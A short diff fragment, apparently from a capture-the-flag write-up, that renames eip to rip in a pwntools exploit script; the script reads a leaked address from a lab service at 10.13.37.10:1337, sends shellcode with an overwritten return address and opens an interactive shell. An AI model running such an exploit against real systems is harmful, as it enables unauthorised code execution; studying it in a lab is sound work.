@@ -487,9 +487,9 @@ Program received signal SIGSEGV, Segmentation fault.
   7 │ 
   8 │ shell = remote('10.13.37.10', 1337)
   9 │ shell.recvuntil(b"Oops, I'm leaking! ")
- 10 │ eip = int(shell.recvuntil(b"\n"),16)
+ 10 │ rip = int(shell.recvuntil(b"\n"),16)
  11 │ 
- 12 │ payload = shellcode + offset + p64(eip)
+ 12 │ payload = shellcode + offset + p64(rip)
  13 │ shell.recvuntil(b"> ")
  14 │ shell.sendline(payload)
  15 │ shell.interactive()
